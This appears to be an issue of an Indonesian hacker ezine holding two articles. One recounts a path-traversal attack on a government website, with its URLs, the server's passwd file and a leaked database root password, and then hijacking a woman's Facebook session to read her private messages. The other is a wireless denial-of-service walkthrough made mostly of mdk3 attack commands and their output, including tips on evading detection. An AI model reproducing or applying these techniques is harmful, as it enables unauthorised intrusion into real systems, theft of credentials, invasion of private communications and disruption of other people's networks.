@@ -1,0 +1,780 @@
+                )     )     )  (        )       
+        (    ( /(  ( /(  ( /(  )\ )  ( /(       
+ (      )\   )\()) )\()) )\())(()/(  )\()) (    
+ )\   (((_) ((_)\ ((_)\ ((_)\  /(_))((_)\  )\   
+((_)  )\___  _((_)  ((_) _((_)(_))   _((_)((_)  
+| __|((/ __|| || | / _ \|_  / |_ _| | \| || __| 
+| _|  | (__ | __ || (_) |/ /   | |  | .` || _|  
+|___|  \___||_||_| \___//___| |___| |_|\_||___| 
+
+
+
+ECHO MAGAZINE VOLUME VIII, ISSUE XXIII, PHILE 0x012.TXT
+
+Hacking LogBook - Various Artist
+
+===[  Hacking Without Tools : Melatih Pola Pikir Kritis - Anton Hilman
+anton/at/hack/dot/my
+
+-----[ Pendahuluan
+
+Tulisan ini ditujukan sebagai bahan pembelajaran semata2, tidak ada tujuan
+untuk menyudutkan pihak2 tertentu dalam pembuatan tulisan ini
+
+-----[ Background
+
+Saya pribadi memperhatikan  bertambah banyaknya newbie yang tools minded, its
+ok belajar menggunakan tools, namun ada satu "gift" yang Tuhan berikan, yaitu
+akal fikiran, disini saya akan coba memberikan contoh bagaimana kita
+mengoptimalkan bagaimana pola berpikir kritis menggunakan akal kita di saat
+yang terjepit, dimana tidak memungkinkan untuk penggunaan tools.
+
+-----[ POC
+
+---------------------------------
+Contoh kasus pertama
+---------------------------------
+
+Saya akan mempergunakan bug sederhana pada situs .gov, Local File Inclusion,
+kalo saya bilang mungkin eksekusinya paling hanya beberapa menit saja :D Tapi
+sekali lagi yang saya titik beratkan disini adalah pola berfikir kritisnya :)
+
+Waktu itu saya sedang browsing mencari satu artikel pada salah satu situs
+pemerintah www.somename.go.id nah artikel yang saya cari ternyata bisa
+didownload berbentuk pdf di url ini
+
+- http://www.somename.go.id/portalbaru/portal/konten.php?nama=Buku&op=index_buku&mn=6&smn=f
+
+disitu saya liat url untuk mendownloadnya adalah
+
+- http://www.somename.go.id/portalbaru/portal/konten.php?nama=Buku&op=dl_buku&namafile=WDR_2008_eng_web.pdf
+
+Pemikiran iseng mulai muncul, bagaimana jika namafile=WDR_2008_eng_web.pdf saya
+ganti menjadi sesuatu.
+
+- http://www.somename.go.id/portalbaru/portal/konten.php?nama=Buku&op=dl_buku&namafile=blablu.pdf
+
+nah WDR_2008_eng_web.pdf saya ubah menjadi blablu.pdf, ternyata aplikasi web
+tadi memperbolehkan saya untuk mendownload blablu.pdf seolah2 file tersebut
+ada, lalu saya ingin mencoba memasukkan path system
+
+- http://www.somename.go.id/portalbaru/portal/konten.php?nama=Buku&op=dl_buku&namafile=../../../etc/passwd
+
+ternyata dia mendownload file juga, tapi isinya kosong, saya asumsikan bahwa
+aplikasi diberikan permission yang cukup tinggi untuk mengakses file2 sensitif
+pada server, saya trial and error aja jika begitu, sehingga mencapai url
+
+- http://www.somename.go.id/portalbaru/portal/konten.php?nama=Buku&op=dl_buku&namafile=../../../../../../../../../../../etc/passwd
+
+nah disini akhirnya file passwd terdownload dengan sempurna
+
+root:*:0:0:Charlie &:/root:/bin/csh
+toor:*:0:0:Bourne-again Superuser:/root:
+daemon:*:1:1:Owner of many system processes:/root:/usr/sbin/nologin
+operator:*:2:5:System &:/:/usr/sbin/nologin
+bin:*:3:7:Binaries Commands and Source:/:/usr/sbin/nologin
+tty:*:4:65533:Tty Sandbox:/:/usr/sbin/nologin
+kmem:*:5:65533:KMem Sandbox:/:/usr/sbin/nologin
+games:*:7:13:Games pseudo-user:/usr/games:/usr/sbin/nologin
+news:*:8:8:News Subsystem:/:/usr/sbin/nologin
+man:*:9:9:Mister Man Pages:/usr/share/man:/usr/sbin/nologin
+sshd:*:22:22:Secure Shell Daemon:/var/empty:/usr/sbin/nologin
+smmsp:*:25:25:Sendmail Submission User:/var/spool/clientmqueue:/usr/sbin/nologin
+mailnull:*:26:26:Sendmail Default User:/var/spool/mqueue:/usr/sbin/nologin
+bind:*:53:53:Bind Sandbox:/:/usr/sbin/nologin
+proxy:*:62:62:Packet Filter pseudo-user:/nonexistent:/usr/sbin/nologin
+_pflogd:*:64:64:pflogd privsep user:/var/empty:/usr/sbin/nologin
+_dhcp:*:65:65:dhcp programs:/var/empty:/usr/sbin/nologin
+uucp:*:66:66:UUCP pseudo-user:/var/spool/uucppublic:/usr/local/libexec/uucp/uucico
+pop:*:68:6:Post Office Owner:/nonexistent:/usr/sbin/nologin
+www:*:80:80:World Wide Web Owner:/nonexistent:/usr/sbin/nologin
+nobody:*:65534:65534:Unprivileged user:/nonexistent:/usr/sbin/nologin
+aman:*:1001:1001:User &:/home/aman:/bin/sh
+mysql:*:88:88:MySQL Daemon:/nonexistent:/sbin/nologin
+
+ya sudah, sampe di sini saya tidak akan memberikan URL lanjutannya, saya hanya
+akan memberikan pola berpikir iseng saya
+
+- step berikutnya saya berfikir, saya harus mencari dimana letak file2 sensitif
+  yang bermanfaat tentunya, karena posisi saya sedang berada di satu warnet
+  (anggaplah begitu) yang tidak memungkinkan saya menjalankan tools, scanner,
+  atau apalah yang semacamnya
+
+- yang saya fikir pertama tentunya dimana letak konfigurasi webserver
+- saya harus mengetahui versi dari web server, daemon web server, serta
+  operating sistem yang digunakan
+- banyak situs di web yang bisa digunakan untuk mencari informasi ini, saya
+  dapatkan informasi bahwa OS nya adalah FreeBSD dengan Apache 2.2 sebagai
+  webserver 
+- Lalu saya googling dengen k/w "httpd.conf in freebsd apache 2.2" muncullah
+  hasil /usr/local/etc/apache22/httpd.conf
+- Kemudian saya download httpd.conf dengan menggunakan metoda di atas, muncul
+  hasil file configurasi, disana saya garis bawahi ada satu baris informasi penting
+
+# Virtual hosts
+Include etc/apache22/extra/httpd-vhosts.conf
+
+- Saya lanjutkan pencarian ke /usr/local/etc/apache22/extra/httpd-vhosts.conf
+
+pada file tersebut saya melihat ada baris
+
+<VirtualHost 192.xxx.1.xxx:80>
+# <VirtualHost 222.xxx.11.xxx:80>
+	ServerAdmin amanbudi@somename.go.id
+	# DocumentRoot "/usr/local/www/apache22/data/web-somename__upload@07032009/portal"
+ 	DocumentRoot "/usr/local/www/apache22/data/portal2"
+	ServerName www.somename.go.id
+
+        Alias /db4dm1n /usr/local/www/apache22/phpMyAdmin
+        <Directory /usr/local/www/apache22/phpMyAdmin>
+                 AllowOverride All
+        </Directory>
+
+- nah berarti disitulah letak phpmyadminnya, beserta url untuk mengaksesnya
+  lalu bagaimana dengan login dan passwordnya?  Phpmyadmin bukanlah suatu
+  aplikasi yang aneh, sebagian besar orang rata2 pernah menggunakannya secara
+  umum settingan default konfigurasi ada di /phpmyadmin direktori/config.inc.php
+
+- Lalu saya lanjutkan ke /usr/local/www/apache22/phpMyAdmin/config.inc.php
+
+dalam file tersebut ada informasi
+$cfg['Servers'][$i]['user'] = 'root';
+$cfg['Servers'][$i]['password'] = 'sf7100sy';
+
+- voila, anda dapat masuk ke dalam mysqladmin, menyelipkan script jahat untuk
+  mendapatkan full akses dari server tersebut
+
+---------------------------------
+Contoh kasus kedua
+---------------------------------
+
+Saya membaca ada bug force TLS menggunakan addon Firefox yang menggunakan nama
+"firesheep" Untuk teknisnya bisa anda googling firesheep, banyak contoh dari
+cara instalasi sampai penggunaan "firesheep", jadi saya tidak akan bahas
+mengenai teknis nya, tapi saya akan bahas modifikasi sedikit dari "firesheep"
+ini.
+
+Saya akui memang basic programming saya amat sangat kurang, tapi bermodalkan
+nekad dan "kebutuhan" harus saya coba sampai bisa.
+
+Ceritanya gini, ada seseorang wanita, sebutlah begitu, nah dia suka meminjam BB
+saya untuk "update status" facebook.  nah, dia memang "agak2" pintar, dia tidak
+ingin menggunakan aplikasi facebook for BlackBerry, jadi dia menggunakan mobile
+facebook untuk meng "update" status facebooknya, tapi dia kemudian lupa
+"logout" nah disinilah ada "celah" terbuka.  Mungkin saya terlalu kritis ya,
+jadi saya ingat meskipun si browser sudah di close, tapi jika belum di "logout"
+cookiesnya akan nempel.
+
+Oke saya masuk  dan melihat2 facebook serta "inbox" dan "sent items" nya
+
+Apa hubungannya dengan "firesheep" ?
+
+Nah ketika saya melihat inbox dan sent items nya disana saya melihat ada kasus
+"perselingkuhan" :D saya kan ingin mengexplore lebih lanjut, dengan siapa
+wanita ini berhubungan dan sampai sejauh mana hubungan tersebut, tapi jika saya
+"browsing" lewat bb yang layarnya relatif kecil nampaknya "kurang nyaman".
+Jadi saya ingin "memindahkan" cookies nya dari bb ke komputer saya agar
+browsing saya lebih nyaman.  Kira-kira ini yang saya lakukan
+
+- Paket BB saya, paket yang hemat jadi browsernya tidak support browsing using
+  WIFI, jadi saya harus terlebih dulu "menginject" browser BB saya agar WIFI
+  enable, tutorialnya ada di situs kaskus :D.
+- Alternatif lainnya saya bisa "pindah paket dulu" lalu send service book agar
+  mendapat konfigurasi browser yang WIFI enable, pindahkan cookies, lalu pindah
+  ke paket lama.
+
+Muncul pertanyaan, kenapa harus WIFI, ya karena saya akan coba menghubungkan
+secara adhoc dari BB ke PC saya, secara opsional addon "firesheep" membutuhkan
+agar device terkoneksi secara LAN :)
+
+- Setelah urusan inject menginject BB browser selesai, saya membuka source code
+  dari firesheep, dan saya tidak melihat adanya konfigurasi dari
+  m.facebook.com, otomatis saya harus buat konfigurasi baru
+- Menggunakan Cookie Editor default bawaan dari browser firefox saya menemukan
+  konfigurasi dari Cookies m.facebook.com
+- saya susunlah kode baru yang kira2 seperti ini, saya namakan KeongRacun
+  firesheep addon for firefox ( sudah saya publish di fb saya )
+
+===============================================================================
+
+//  Authors:Eric Butler <eric@codebutler.com>
+//  Modifiers : Anton Hilman <anton@hack.my>
+//  Web : http://dasarkaukeongracun.com/ 
+
+register({
+  name: 'MobileFacebook',
+  url: 'http://m.facebook.com/home.php',
+  domains: [ 'facebook.com' ],
+  sessionCookieNames: [ 'm_user' ],
+
+//Havent configure code below, Im too lame to fetch photos, who care :p
+  identifyUser: function () {
+    var resp = this.httpGet(this.siteUrl);
+    this.userName   = resp.body.querySelector('#navAccountName').innerHTML;
+    this.userAvatar = resp.body.querySelector('#navAccountPic img').src;
+  }
+});
+
+===============================================================================
+
+- Lalu saya jalankanlah skenario firesheep ini dengan adhoc pada pc saya hehehe
+- Voila cookies nya pindah ke browser saya, dan saya bisa browsing
+  "perselingkuhan" tersebut dengan nyaman dan menemukan informasi2 penting yang
+  tidak mungkin saya share di sini.
+
+Hehe mungkin hal ini very "silly" and "ocassionally" tapi memang dari
+kekritisan pemikiran serta kekurang kerjaan-an" suka muncul hal yang diluar
+harapan kita
+
+- Jika dikembangkan lagi *mungkin* bisa hijack session dari m banking, yang
+  baru diimplementasikan oleh beberapa bank swasta di Indonesia akhir2 ini,
+  karena sudah "iseng" saya cek mereka masih vurnerable against force TLS.
+
+---[ Kesimpulan
+
+Untuk mendapatkan Full Akses dari suatu sistem tidak selalu harus menggunakan
+tools Kadang kita harus mengkonfigurasi sendiri tools / script yang kita
+perlukan, karena kebutuhan tiap kasus biasanya berbeda (exploit on fire).
+
+Pengetahuan yang cukup luas yang didapat dari membaca dan pengalaman amat
+sangat diperlukan Agar terbiasa harus selalu "berlatih" Jangan cepat putus asa
+jika menghadapi suatu masalah, jika tidak hari ini masih ada hari esok Biasakan
+untuk berfikir tenang ketika keaadaan menjadi rumit agar kita bisa melihat dari
+sisi lain.
+
+Gunakan apa yang ada dulu di sekeliling kita, serta optimalkan hal-hal tersebut
+Janganlah membalas kejahatan dengan kejahatan lagi :) Jangan lupa berdoa,
+karena "luck" memang menjadi bagian dari proses :D Semoga bermanfaat :)
+
+
+-----[ Referensi
+
+[1] Google
+     www.google.com
+[2] Kaskus
+     www.kaskus.us
+[3] Firesheep 
+     http://codebutler.github.com/firesheep/welcome.html
+    
+Thx to Allah SWT, my family, my friend @ Indonesian - Malaysian Cyberground 
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+*****************************************************************************
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%                                                                     
+                                                                                                                                         
+                                             
+===[ Kill Randomic Access Point - Lirva32
+lirva32/at/echo/dot/or/dot/id
+
+Hai all....  Akhirnya kita ketemu lagi... kali ini saya ingin membahas tentang
+segala sesuatu tindakan destruktif terhadap jaringan wireless khususnya
+penyerangan terhadap Access Point.  Sungguh, tindakan yang saya paparkan ini
+sangat destruktif sekali..jadi mohon maaf, jangan gunakan tindakan ini untuk
+melakukan penyerangan terhadap jaringan wireless milik pemerintah. lembaga
+pendidikan dan tangsi2 sosial lainnya.
+
+-----[ Persiapan 
+[0] Wireless USB, saya mempergunakan 3 devices wireless USB yang support dengan
+packet injection, yaitu :
+    . Intel Wireless 3945ABG (My internalnotebook Wireless)
+      Wireless devices ini saya gunakan untuk menjalankan Kismet dan Kismet Console.
+    . AirLive WL-360USB dengan antena Omni AirLive 10 dbi
+      Wireless devices ini saya gunakan untuk melakukan penyerangan pada Console 1.
+    . AirLive WL-1600USB dengan antena Omni AirLive 10 dbi
+      Wireless devices ini saya gunakan untuk melakukan penyerangan pada Console 2.
+
+    * Penyerangan dilakukan melalui 2 console agar AP yang menjadi target
+      mendapat serangan yang benar2 terserang.
+    
+    * Saya mempergunakan antena omni 10 dbi agar dapat melakukan tindakan
+      penyerangan dari kejauhan... kalo dari deket nanti ketauan pemilik AP loh
+      ... becarefull !!!
+
+[1] Dalam penyerangan ini saya mempergunakan Linux BackTrack 4 R1, saya tidak
+mempergunakan BackTrack 4 R2 karena saya belum donlod...lol
+
+[2] Tentu ada AP yang menjadi target !!! kali ini yang menjadi target adalah AP
+milik kantor tempat saya bekerja yaitu : Linksys WRT54GL yang sudah diupgrade
+firmwarenya meempergunakan DDWRT versi 2.4 SP1.
+
+-----[ Tindakan Destruktif
+
+Ada beberapa tindakan destruktif yang bisa dilakukan terhadap AP pada suatu
+jaringan wireless, diantaranya :
+[1] Beacon Flooding : tindakan penyerangan dengan mengirimkan "Beacon Frames"
+dengan membuat banyak Fake AP.  Tindakan ini akan mengakibatkan jaringan
+wireless menjadi "crash" untuk beberapa waktu.
+
+[2] Authentication DoS Mode : tindakan penyerangan dengan mengirimkan
+"Authentication Frame" ke semua AP yang terditeksi dalam jaringan wireless.
+Tindakan ini akan mengakibatkan client (user wireless) tidak bisa melakukan
+koneksi ke AP, bahkan client (user wireless) yang sudah terkoneksi ke AP akan
+ter-reset dan putus koneksi.
+
+[3] Deauthentication / Disassociation Amok Mode : tindakan penyerangan dengan
+memutuskan koneksi client (user wireless) ke AP.  Tindakan ini akan
+mengakibatkan tertendangnya "KickS" semua pemakai AP yang terkoneksi akibatnya
+ya putus koneksi.
+
+[4] Michael Shutdown Exploitation (TKIP) : tindakan memutuskan dan membatalkan
+semua traffic yang menuju AP.  Tindakan ini akan mengakibatkan client (user
+wireless) tidak dapat melanjutkan traffic koneksi ke AP.
+
+[5] WIDS/WIPS/WDS Confusion : tindakan pengacauan terhadap IDS dan IPS jaringan
+wireless dan pengacauan WDS routing.
+
+[6] MAC filter bruteforce mode : tindakan penyerangan terhadap AP yang memiliki
+keamanan "MAC Filtering".
+
+[7] WPA Downgrade test : tindakan penyerangan dengan mempergunakan
+"deauthenticates Stations and AP" untuk melakukan pengiriman packet enkripsi
+WPA yang mengakibatkan "WPA broken".
+
+
+Bagaimana teknik penyerangan :
++-----------------------------------------------------------------+
+| Memastikan devices wireless yang kita gunakan sudah terpasang : |
++-----------------------------------------------------------------+
+
+root@bt:~# iwconfig
+
+lo        no wireless extensions.
+
+eth0      no wireless extensions.
+
+wlan0     IEEE 802.11bg  Mode:Managed  Access Point: Not-Associated
+          Tx-Power=0 dBm
+          Retry  long limit:7   RTS thr:off   Fragment thr:off
+          Encryption key:off
+          Power Management:off
+
+wlan1     IEEE 802.11abg  Mode:Managed  Access Point: Not-Associated
+          Tx-Power=0 dBm
+          Retry  long limit:7   RTS thr:off   Fragment thr:off
+          Encryption key:off
+          Power Management:off
+
+wlan2     IEEE 802.11bgn  Mode:Managed  Access Point: Not-Associated
+          Tx-Power=0 dBm
+          Retry  long limit:7   RTS thr:off   Fragment thr:off
+          Encryption key:off
+          Power Management:on
+
+root@bt:~#
++----------------------------------------+
+| Memastikan ada AP yang akan diserang : |
++----------------------------------------+
+root@bt:~# airodump-ng wlan1
+
+Hasil :
+
++--------------------------------------------------------------------------------------------------------+
+|CH 11 ][ Elapsed: 2 mins ][ 2010-12-28 10:32                                                            |
+|                                                                                                        |
+| BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID                         |
+|                                                                                                        |
+| 00:25:9C:C1:30:0E  -37      484        0    0  11  54e. WPA  TKIP   PSK  Hack_Me                       |
+| 00:1E:C1:AB:35:9B  -76      257       38    0  11  54 . OPN              xxxxxxxxx_FreeHotSpotPremium  |
+| 00:1C:DF:A3:DC:B5  -78      318      124    0   6  54e  WPA  TKIP   PSK  engsun                        |
+| 00:23:69:4F:D2:B2  -82        6      129    0  10  54   WPA  TKIP   PSK  xxxxxxxxx_Hotspot_3           |
+|                                                                                                        |
+| BSSID              STATION            PWR   Rate    Lost  Packets  Probes                              |
+|                                                                                                        |
+| (not associated)   00:1E:64:32:A8:78  -77    0 - 1      0        5  xxxxxxxxx_FreeHotSpotPremium       |
+| (not associated)   00:26:69:24:3A:92  -79    0 - 1      0       23                                     |
+| 00:1E:C1:AB:35:9B  B4:82:FE:0A:53:51  -59    0 -12      0      109                                     |
+| 00:1E:C1:AB:35:9B  00:26:5E:75:62:F7  -81    0 - 1      0       10  xxxxxxxxx_FreeHotSpotPremium       |
+| 00:23:69:4F:D2:B2  00:17:C4:78:D1:4B  -61    1 - 1     34      157  xxxxxxxxx_Hotspot_3                |
++--------------------------------------------------------------------------------------------------------+
+
+Perhatikan, yang menjadi target dalam kali ini adalah :
++------------------------------------------------------------------------------------+
+| 00:25:9C:C1:30:0E  -37      484        0    0  11  54e. WPA  TKIP   PSK  Hack_Me   |
++------------------------------------------------------------------------------------+
+
+*semua ujicoba ini dilakukan pada AP milik kantor tempat saya bekerja !! dan
+sudah mendapat izin dari saya sendiri karena saya administratornya..lol
+
++---------------------------------+
+| Penyerangan : Beacon Flooding   |
++---------------------------------+
+command : ./mdk3 <wifi_interface> b -n <ssid_target>
+
+. lakukan penyerangan pada 2 console :
+
+console 1 :
+root@bt:/pentest/wireless/mdk3# ./mdk3 wlan1 b -n Hack_Me
+
+console 2 :
+root@bt:/pentest/wireless/mdk3# ./mdk3 wlan2 b -n Hack_Me
+
+Hasil :
+
+Current MAC: C6:69:73:51:FF:4A on Channel  2 with SSID: Hack_Me
+Current MAC: 46:7C:C2:54:F8:1B on Channel 14 with SSID: Hack_Me
+Current MAC: FC:E4:66:DA:61:0B on Channel  7 with SSID: Hack_Me
+Current MAC: B0:1E:6D:4A:4F:D1 on Channel  6 with SSID: Hack_Me
+Current MAC: 76:CA:F2:AB:75:25 on Channel 11 with SSID: Hack_Me
+-
+-
+-
+
+Current MAC: 0F:BA:C0:57:2B:A4 on Channel  8 with SSID: Hack_Me
+Current MAC: 13:9C:A8:EE:FF:43 on Channel  5 with SSID: Hack_Me
+Current MAC: 99:BD:2C:CB:23:07 on Channel 13 with SSID: Hack_Me
+Current MAC: F9:31:5B:28:05:0E on Channel  2 with SSID: Hack_Me
+Packets sent:   8900 - Speed:   62 packets/sec
+
+Hasil Penyerangan yang dipantau Kismet Console :
++-------------------------------------------------------------------------+
+ ÁãΩINFO: Detected new managed network "Hack_Me", BSSID 90:A5:F9:FB:33:1E,       
+ ÁãΩ      encryption no, channel 1, 11.00 mbit                                   
+ ÁãΩINFO: Detected new managed network "Hack_Me", BSSID 22:EF:4F:65:73:9F,       
+ ÁãΩ      encryption no, channel 14, 11.00 mbit                                  
+ ÁãΩINFO: Detected new managed network "Hack_Me", BSSID 86:FC:85:DA:6A:6F,       
+ ÁãΩ      encryption no, channel 3, 11.00 mbit                                   
+ ÁãΩINFO: Detected new managed network "Hack_Me", BSSID FC:D0:7B:58:F5:4F,       
+ ÁãΩ      encryption no, channel 3, 11.00 mbit                                  
+ ÁãΩINFO: Detected new managed network "Hack_Me", BSSID F1:DC:CC:81:81:C5,     
+ ÁãΩ      encryption no, channel 7, 11.00 mbit                                   
+ ÁãΩINFO: Detected new managed network "Hack_Me", BSSID B4:E3:4A:D6:D2:99,       
+ ÁãΩ      encryption no, channel 13, 11.00 mbit                                 
+ ÁãΩINFO: Detected new managed network "Hack_Me", BSSID 45:38:0C:CB:35:91,     
+ ÁãΩ      encryption no, channel 1, 11.00 mbit                                  
+ ÁãΩINFO: Detected new managed network "Hack_Me", BSSID 9F:00:2C:9B:D0:A8,      
+ ÁãΩ      encryption no, channel 7, 11.00 mbit                                 
+ ÁãΩINFO: Detected new managed network "Hack_Me", BSSID FC:2F:67:7C:BD:2B,      
+ ÁãΩ      encryption no, channel 4, 11.00 mbit                                  
+ ÁãΩINFO: Detected new managed network "Hack_Me", BSSID 5C:AB:20:6E:80:3C,       
+ ÁãΩ      encryption no, channel 11, 11.00 mbit                                  
++-------------------------------------------------------------------------+
+ 
+* Lakukan teknik penyerangan ini selama kurang lebih (--pake txt susah bikin "
+* + - "nih ) 20 menit saja, saya pastikan setelah
+20 menit maka jaringan wireless akan "crash". Now.. say " Bye..bye...AP " lol
+
+Makin lama melakukan penyerangan ini, maka makin banyak Fake AP yang tercipta
+nah Fake AP inilah yang akan melakukan penyerangan dan menciptakan crash AP
+yang menjadi target.  Makin banyak Fake AP yang tercipta itu artinya juga makin
+banyak client yang bingung melakukan koneksi ke AP karena nama SSID yang
+dimiliki si Fake AP pun sama.
+
++----------------------------------------+
+| Penyerangan : Authentication DoS Mode  |
++----------------------------------------+
+
+command : ./mdk3 <wifi_interface> a -a <mac_ap_target>
+
+. lakukan penyerangan pada 2 console :
+
+console 1 :
+root@bt:/pentest/wireless/mdk3# ./mdk3 wlan1 a -a 00:25:9C:C1:30:0E
+
+
+console 2 :
+root@bt:/pentest/wireless/mdk3# ./mdk3 wlan2 a -a 00:25:9C:C1:30:0E
+
+Hasil :
+
+Device is still responding with 101000 clients connected!
+AP 00:25:9C:C1:30:0E seems to be INVULNERABLE!
+Device is still responding with 101500 clients connected!
+Connecting Client: CE:2F:06:5A:53:43 to target AP: 00:25:9C:C1:30:0E
+AP 00:25:9C:C1:30:0E seems to be INVULNERABLE!
+-
+-
+-
+
+AP 00:25:9C:C1:30:0E seems to be INVULNERABLE!
+Device is still responding with 305500 clients connected!
+AP 00:25:9C:C1:30:0E seems to be INVULNERABLE!
+Device is still responding with 306000 clients connected!
+Connecting Client: 61:13:0D:78:D8:7A to target AP: 00:25:9C:C1:30:0E
+AP 00:25:9C:C1:30:0E seems to be INVULNERABLE!
+Device is still responding with 306500 clients connected!
+
+Hasil Penyerangan yang dipantau Kismet Console :
++-----------------------------------------------------------------------------+
+ ÁãΩLOCAL: Flushed protocol data backlog for Kismet client 12                    
+ ÁãΩLOCAL: Flushed protocol data backlog for Kismet client 15                    
+ ÁãΩLOCAL: Client 12 ring buffer full, storing Kismet protocol data in backlog   
+ ÁãΩ       vector                                                                
+ ÁãΩLOCAL: Client 15 ring buffer full, storing Kismet protocol data in backlog   
+ ÁãΩ       vector                                                                
+ ÁãΩLOCAL: Flushed protocol data backlog for Kismet client 12                    
+ ÁãΩLOCAL: Flushed protocol data backlog for Kismet client 15                    
+ ÁãΩLOCAL: Client 12 ring buffer full, storing Kismet protocol data in backlog   
+ ÁãΩ       vector                                                                
+ ÁãΩLOCAL: Client 15 ring buffer full, storing Kismet protocol data in backlog   
+ ÁãΩ       vector                                                                
+ ÁãΩLOCAL: Flushed protocol data backlog for Kismet client 12                    
+ ÁãΩLOCAL: Flushed protocol data backlog for Kismet client 15                    
+ ÁãΩLOCAL: Client 12 ring buffer full, storing Kismet protocol data in backlog   
+ ÁãΩ       vector                                                                
+ ÁãΩLOCAL: Client 15 ring buffer full, storing Kismet protocol data in backlog   
+ ÁãΩ       vector                                                                
+ ÁãΩLOCAL: Flushed protocol data backlog for Kismet client 12                    
+ ÁãΩLOCAL: Flushed protocol data backlog for Kismet client 15                    
+ ÁãΩ                                                                            
++------------------------------------------------------------------------------+
+
+* Lakukan teknik penyerangan ini selama kurang lebih 30 menit saja, saya
+pastikan bahwa semua clients (user wifi) akan terputus dan tidak ada user
+yang bisa melakukan koneksi ke AP.  Kismet Console pun tak mampu
+melakukan monitoring karena AP yang dimonitor mengalami "Ring Buffer Full. Now,
+say "bye..bye...user " lol.
+
++-----------------------------------------------------------+
+| Penyerangan : Deauthentication / Disassociation Amok Mode |
++-----------------------------------------------------------+
+
+command : ./mdk3 <wifi_interface> d -c <channel_target>
+
+. lakukan penyerangan pada 2 console :
+
+console 1 :
+root@bt:/pentest/wireless/mdk3# ./mdk3 wlan1 d -c 11
+
+console 2 :
+root@bt:/pentest/wireless/mdk3# ./mdk3 wlan2 d -c 11
+
+Hasil :
+
+Disconnecting between: 00:17:C4:78:D1:4B and: 00:23:69:4F:D2:B2 on channel: 11
+Disconnecting between: FF:FF:FF:FF:FF:FF and: 00:1C:DF:A3:DC:B5 on channel: 11
+Disconnecting between: FF:FF:FF:FF:FF:FF and: 00:1C:DF:A3:DC:B5 on channel: 11
+Disconnecting between: 00:17:C4:78:D1:4B and: 00:23:69:4F:D2:B2 on channel: 11
+Disconnecting between: 00:17:C4:78:D1:4B and: 00:23:69:4F:D2:B2 on channel: 11
+Disconnecting between: FF:FF:FF:FF:FF:FF and: 00:1C:DF:A3:DC:B5 on channel: 11
+-
+-
+-
+Disconnecting between: 00:17:C4:78:D1:4B and: 00:23:69:4F:D2:B2 on channel: 11
+Disconnecting between: 00:17:C4:78:D1:4B and: 00:23:69:4F:D2:B2 on channel: 11
+Disconnecting between: FF:FF:FF:FF:FF:FF and: 00:1C:DF:A3:DC:B5 on channel: 11
+Disconnecting between: FF:FF:FF:FF:FF:FF and: 00:1C:DF:A3:DC:B5 on channel: 11
+Packets sent:   1325 - Speed:   12 packets/sec
+
+
+Hasil Penyerangan yang dipantau Kismet Console :
++-------------------------------------------------------------------------------+
+ ÁãΩALERT: BCASTDISCON Network BSSID 00:1C:DF:A3:DC:B5 broadcast deauthenticate  
+ ÁãΩ       /disassociation of all clients, possible DoS                          
+ ÁãΩALERT: BCASTDISCON Network BSSID 00:1C:DF:A3:DC:B5 broadcast deauthenticate  
+ ÁãΩ       /disassociation of all clients, possible DoS                          
+ ÁãΩALERT: BCASTDISCON Network BSSID 00:1C:DF:A3:DC:B5 broadcast deauthenticate  
+ ÁãΩ       /disassociation of all clients, possible DoS                          
+ ÁãΩALERT: BCASTDISCON Network BSSID 00:1C:DF:A3:DC:B5 broadcast deauthenticate  
+ ÁãΩ       /disassociation of all clients, possible DoS                          
+ ÁãΩALERT: BCASTDISCON Network BSSID 00:1C:DF:A3:DC:B5 broadcast deauthenticate  
+ ÁãΩ       /disassociation of all clients, possible DoS                          
+ ÁãΩALERT: BCASTDISCON Network BSSID 00:1C:DF:A3:DC:B5 broadcast deauthenticate  
+ ÁãΩ       /disassociation of all clients, possible DoS                          
+ ÁãΩALERT: BCASTDISCON Network BSSID 00:1C:DF:A3:DC:B5 broadcast deauthenticate  
+ ÁãΩ       /disassociation of all clients, possible DoS                          
+ ÁãΩALERT: BCASTDISCON Network BSSID 00:1C:DF:A3:DC:B5 broadcast deauthenticate  
+ ÁãΩ       /disassociation of all clients, possible DoS                          
+ ÁãΩALERT: BCASTDISCON Network BSSID 00:1C:DF:A3:DC:B5 broadcast deauthenticate  
+ ÁãΩ       /disassociation of all clients, possible DoS                          
+ ÁãΩALERT: BCASTDISCON Network BSSID 00:1C:DF:A3:DC:B5 broadcast deauthenticate  
+ ÁãΩ       /disassociation of all clients, possible DoS                         
+ ÁãΩ                                                                           
++--------------------------------------------------------------------------------+
+
+* Lakukan teknik penyerangan ini selama kurang lebih 20 menit saja, saya
+pastikan bahwa semua clients pada channel yand ditargetkan akan terputus.
+Ingat..jika ada beberapa AP yang mepergunakan channel yang sama maka semua yg
+berada pada channel tersebut yang menjadi target.  Now, say " just having
+fun....lol "
+
++----------------------------------------------------+
+| Penyerangan : Michael shutdown exploitation (TKIP) |
++----------------------------------------------------+
+
+command : ./mdk3 <wifi_interface> m -t <mac_ap_target>
+
+. lakukan penyerangan pada 2 console :
+
+console 1 :
+root@bt:/pentest/wireless/mdk3# ./mdk3 wlan1 m -t 00:25:9C:C1:30:0E
+
+console 2 :
+root@bt:/pentest/wireless/mdk3# ./mdk3 wlan2 m -t 00:25:9C:C1:30:0E
+
+Hasil :
+
+Connecting Client: A7:13:C2:56:81:11 to target AP: 00:25:9C:C1:30:0E
+AP 00:25:9C:C1:30:0E seems to be INVULNERABLE!
+Device is still responding with 225000 clients connected!
+AP 00:25:9C:C1:30:0E seems to be INVULNERABLE!
+Device is still responding with 225500 clients connected!
+Connecting Client: 5A:AC:9A:B7:02:41 to target AP: 00:25:9C:C1:30:0E
+AP 00:25:9C:C1:30:0E seems to be INVULNERABLE!
+Device is still responding with 226000 clients connected!
+AP 00:25:9C:C1:30:0E seems to be INVULNERABLE!
+Device is still responding with 226500 clients connected!
+-
+-
+-
+Connecting Client: 7C:49:90:FC:94:F4 to target AP: 00:25:9C:C1:30:0E
+AP 00:25:9C:C1:30:0E seems to be INVULNERABLE!
+Device is still responding with 319000 clients connected!
+AP 00:25:9C:C1:30:0E seems to be INVULNERABLE!
+Device is still responding with 319500 clients connected!
+Connecting Client: 2C:7F:31:E3:8F:BC to target AP: 00:25:9C:C1:30:0E
+AP 00:25:9C:C1:30:0E seems to be INVULNERABLE!
